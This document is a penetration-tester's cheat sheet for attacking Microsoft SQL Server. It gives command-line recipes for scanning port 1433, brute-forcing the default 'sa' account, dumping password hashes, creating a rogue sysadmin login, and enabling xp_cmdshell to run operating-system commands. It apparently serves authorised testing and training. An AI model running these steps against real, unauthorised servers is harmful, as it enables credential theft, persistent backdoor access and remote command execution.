# MSSQL Enumeration(1433)

MSSQL is Microsoft SQL Server for database management mainly for the windows-based system. SQL servers generally use port 1433 but you may found on other ports as well.

### **Databases to look**

- **master Database**: contains Server's configuration settings and login account information
- **msdb Database**: used by SQL Server Agent for scheduling alerts and jobs.



### Information Gathering

**Version detection without credentials** 

Nmap 

```basic
nmap -p 1433 -sV 127.0.0.1
```

Metasploit

```basic
use auxiliary/scanner/mssql/mssql_ping
set rhosts 127.0.0.1
exploit
```


**Some important Nmap scripts**

```
ms-sql-info                    >> information regarding the database
ms-sql-brute		       >> Bruteforce weak password for authentication [mostly username=sa,mssql.password=]
ms-sql-hasdbaccess.nse         >> Find database name for sa user and other
ms-sql-tables.nse              >> Query for Tables names
ms-sql-xp-cmdshell.nse         >> 2000 version of SQL Server xp_cmdshell is enabled by default so we can even execute OS command

```

**Usage**

```
nmap -p 1433 --script ms-sql-info 127.0.0.1
nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=Password 127.0.0.1
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=Password 127.0.0.1
nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=Password 127.0.0.1
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=Password,ms-sql-xp-cmdshell.cmd="whoami" 127.0.0.1

```


### Using Metasploit

Version detection

```basic
use auxiliary/admin/mssql/mssql_sql
```

Enumerate server and try to get all info

```basic
use auxiliary/admin/mssql/mssql_enum
```

SQL Users Enumeration

```basic
use auxiliary/admin/mssql/mssql_enum_sql_login
```

Dumping Database

```basic
use auxiliary/admin/mssql/mssql_findandsampledata
```

Hash dump of the users 

```basic
use auxiliary/scanner/mssql/mssql_hashdump
```

Checking for command execution using Xp_cmdshell

```basic
use exploit/windows/mssql/mssql_payload
```

Gain privileges by impersonating another user

```basic
use auxiliary/admin/mssql/mssql_escalate_execute_as
```

### **Usage**

```
use auxiliary/admin/mssql/mssql_enum
set rhosts 127.0.0.1
set username admin
set password Pass123
exploit
```

> Some of these auxiliaries have a dependency like login_cred, databases_name or sql_file




### **Bruteforcing mssql**

**Default cred**

Default username is **sa** and the default password is **blank**.

Nmap

```basic
nmap -p1433 –script ms-sql-brute --script-args userdb=user_wordlist.txt_path,passdb=pass_wordlist.txt_path 127.0.0.1
```

Metasploit

```basic
use auxiliary/scanner/mssql/mssql_login
```

Hydra

```basic
hydra -L user_wordlist.txt_path –P pass_wordlist.txt_path 127.0.0.1 mssql
```

medusa

```basic
medusa -h 127.0.0.1 –U user_wordlist.txt_path –P pass_wordlist.txt_path –M mssql
```

> sometimes brute-forcing may lock a user account so be careful





### If you have credentials login with the client tool

Interactive database shell 

```basic
sqsh -S 127.0.0.1 -U username -P Password -D [Database]
```

Impacket mssqlclient module

```basic
mssqlclient.py 'user_name:password@127.0.0.1'
```

GUI Tool use only if database is large in size

```basic
dbeaver          
```




### Common Queries

Information  | Query
------------ | -------------
Version			 |  SELECT @@version
Current User  |  SELECT SUSER_SNAME()  SELECT SYSTEM_USER
Current Role  |  SELECT IS_SRVROLEMEMBER('sysadmin')  SELECT user
Current Database |  SELECT db_name()
List All Databases  |  SELECT name FROM master..sysdatabases
List All Logins  |  SELECT * FROM sys.server_principals WHERE type_desc != 'SERVER_ROLE'
List All Users for Database  |  SELECT * FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE'
List All Sysadmins  |  SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1




### Query after login

Database version

```basic
SELECT @@version;
```

Server name

```basic
SELECT @@servername;
```

Get databases

```basic
SELECT name FROM master.dbo.sysdatabases ;
```

Get databases

```basic
SELECT name FROM master.sys.databases;
```

Get table names

```basic
SELECT table_name,table_schema from [databaseName].INFORMATION_SCHEMA.TABLES;
```

List Linked Servers

```basic
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
```

List users

```basic
SELECT sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```

Create a user with sysadmin privs

```basic
CREATE LOGIN hacker WITH PASSWORD = 'h@cker@123';
sp_addsrvrolemember 'hacker', 'sysadmin';
```




### Try to Execute System command using xp_cmdshell

1. Try and see if it works as it’s disabled by default

```basic
xp_cmdshell 'whoami';
go
```

2. If first fails try to enable component using these commands

```basic
EXEC sp_configure 'xp_cmdshell', 1;
reconfigure;
go
xp_cmdshell 'whoami';
go
```

3. If you have permission to enable it

```basic
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
go
xp_cmdshell 'whoami';
go
```


### References

[hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

[hackingarticles](https://www.hackingarticles.in/mssql-for-pentesternmap/)

[pentestlab](https://pentestlab.blog/)

[0xdf](https://0xdf.gitlab.io/tags.html#mssqlclient)

[SecLists](https://github.com/danielmiessler/SecLists)

[SofianeHamlaoui](https://github.com/SofianeHamlaoui/Pentest-Notes)
